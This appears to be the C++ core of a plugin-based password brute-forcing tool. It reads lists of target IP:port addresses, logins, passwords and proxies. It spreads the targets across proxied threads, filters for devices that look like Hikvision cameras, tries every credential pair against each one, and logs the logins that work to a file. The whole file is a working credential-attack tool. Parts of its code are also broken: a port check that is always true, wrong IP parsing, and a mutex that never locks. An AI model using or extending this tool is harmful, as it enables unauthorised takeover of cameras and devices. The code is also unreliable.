#include "plugin.hpp"
#include "base.hpp"
#include "filesystem_resolver.hpp"
#include "input_model.hpp"
#include "plugin_api.hpp"
#include "plugin_info_model.hpp"
#include <format>
#include <optional>
#include <stdexcept>
#include <stop_token>
#include <utility>
#include <vector>
#include <fstream>
#include <thread>

Plugin::Plugin(const std::string& outputPath,
               const std::string& inputPath,
               const std::string& loginPath,
               const std::string& passwordPath,
               const std::string& proxyPath,
               const unsigned short threads,
               PluginInfoModel pluginInfo
) : pluginInfo(pluginInfo), threads(threads), outputPath(outputPath)
{
    readData(logins, loginPath);
    readData(passwords, passwordPath);
    readData(inputs, inputPath);
    readData(proxies, proxyPath);
    loader = helpers::loader::createLoader(pluginInfo.path);
    auto get_plugin_api = loader->getFunction<PluginAPI* (*)()>("get_plugin_api");
    api = get_plugin_api();
    if (!api)
        throw std::runtime_error(std::format("Plugin {} returned null api", pluginInfo.name));
}

const std::string Plugin::getVersion() const noexcept {
    return std::string(api->getVersion());
}

const std::optional<std::pair<std::string, unsigned short>>
Plugin::parseAddr(const std::string& addr) {
    std::string ip = addr;
    unsigned short port = 0;

    size_t pos = ip.find(':');
    if (pos != std::string::npos && pos != ip.size() - 1) {
        int p = std::stoi(ip.substr(pos + 1));
        
        if (p >= 0 || p <= 65535)
            port = static_cast<unsigned short>(p);
        
        ip = ip.substr(0, pos);
    }

    std::string ipCopy = ip;
    int octetCount = 0;

    for (; (pos = ip.find('.')) != std::string::npos && pos != ip.size() - 1; octetCount++) {
        int octet = std::stoi(ipCopy.substr(0, pos));
        if (octet < 0 || octet > 255)
            return std::nullopt;
        ipCopy = ipCopy.substr(pos + 1);
    }

    if (!ipCopy.empty()) {
        int octet = std::stoi(ipCopy);
        if (octet < 0 || octet > 255)
            return std::nullopt;

        octetCount++;
    }

    if (octetCount != 4)
        return std::nullopt;

    return std::make_pair(ip, port);
}

void Plugin::readData(std::vector<std::string> &v, const std::string &filePath) {
    std::ifstream file((helpers::resolvePath(filePath)));
    if (!file.is_open())
        throw std::runtime_error(std::format("Failed open file: {}", filePath));

    std::string s;
    while (std::getline(file, s)) {
        if (s.empty()) continue;

        v.push_back(s);
    }
}

void Plugin::readData(std::vector<models::Addr>& v, const std::string& filePath) {
    std::ifstream file((helpers::resolvePath(filePath)));
    if (!file.is_open())
        throw std::runtime_error(std::format("Failed open file: {}", filePath));

    std::string s;
    while (std::getline(file, s)) {
        if (s.empty()) continue;

        auto res = parseAddr(s);
        if (!res) continue;

        v.push_back({res->first, res->second});
    }
}

void Plugin::readData(std::vector<models::Proxy>& v, const std::string& filePath) {
    std::ifstream file((helpers::resolvePath(filePath)));
    if (!file.is_open())
        throw std::runtime_error("Error open input file: " + filePath);

    std::string s;
    while (std::getline(file, s)) {
        if (s.empty()) continue;

        std::string username{}, password{};
        int pos = s.find('@');
        if (pos != std::string::npos) {
            int newPos = s.find(':');
            if (newPos < pos) {        
                username = s.substr(0, newPos);
                password = s.substr(newPos + 1, pos - newPos - 1);
                s = s.substr(pos + 1);
            }
        }

        auto res = parseAddr(s);
        if (!res) continue;

        v.push_back({
            res->first,
            res->second,
            username,
            password,
            "http"
        });
    }
}

void Plugin::work() const {
    size_t const length = inputs.size();
    size_t const num_threads = std::min(
        std::min(
            std::min(
                inputs.size(),
                proxies.size()
            ),
            (size_t)threads
        ),
        (size_t)MAX_THREAD_COUNT
    );
    size_t const block_size = length / num_threads;
    size_t const remainder = length % num_threads;

    std::vector<std::thread> threads(num_threads);

    auto block_start = inputs.begin();

    size_t i{};
    for (; i < num_threads - 1; i++) {
        size_t const step = i < remainder ? block_size + 1 : block_size;
        auto block_end = block_start;
        std::advance(block_end, step);
        threads[i] = std::thread(
            &Plugin::brute_wrapper,
            this,
            block_start,
            block_end,
            proxies.at(i)
        );
        block_start = block_end;
    }

    threads[i] = std::thread(
        &Plugin::brute_wrapper,
        this,
        block_start,
        inputs.end(),
        proxies.at(i)
    );

    for (auto& thread : threads)
        if (thread.joinable())
            thread.join();
    api->work();
}

const std::stop_source& Plugin::getStopSource() const noexcept {
    return stop_source;
}

void Plugin::brute(const models::Addr& addr, const models::Proxy &proxy, std::stop_token st) {
    for (const auto &login : logins) { 
        for (const auto &password : passwords) {
            if (st.stop_requested()) return;
            // std::cout << "Address: " << addr.ip << ":" << addr.port <<
            //              ". Trying combination: " + login << " " << password << std::endl;
            if (api->sendRequest(addr, proxy, login, password)) {
                // std::cout << "Found valid creds: \n" <<
                // "Login: " << login << '\n' <<
                // "Password: " << password << std::endl;
                models::Result output{addr.ip, addr.port, login, password};
                results.push_back(output);
                printResult(output);
                return;
            }
        }
    }
}

void Plugin::brute_wrapper(std::vector<models::Addr>::iterator begin_addr, std::vector<models::Addr>::iterator end_addr, models::Proxy proxy) {
    for (; begin_addr != end_addr; ++begin_addr) {
        // Temp solution
        if (begin_addr->port == 0) {
            // std::cout << "Address does not have specified port. Skip for now..." << std::endl;
            continue;
        }
        auto [ip, port] = *begin_addr;
        if (!api->validateAddr(ip.c_str(), port)) {
            // std::cout << "Address [" << begin_addr->ip << ':' << begin_addr->port << "] does not correspond to hikvision" << std::endl;
            continue;
        }

        brute(*begin_addr, proxy, stop_source.get_token());
    }
}

void Plugin::printResult(const models::Result& output) {
    std::lock_guard<std::mutex> l(std::mutex);
    std::ofstream file(outputPath, std::ios_base::out | std::ios_base::app);

    if (!file.is_open()) {
        // std::cerr << "Unable open file " << outputFile << std::endl;
        return;
    }

    file << output.addr.ip << ':' << output.addr.port << ' ' << output.login << ':' << output.password << '\n';
}
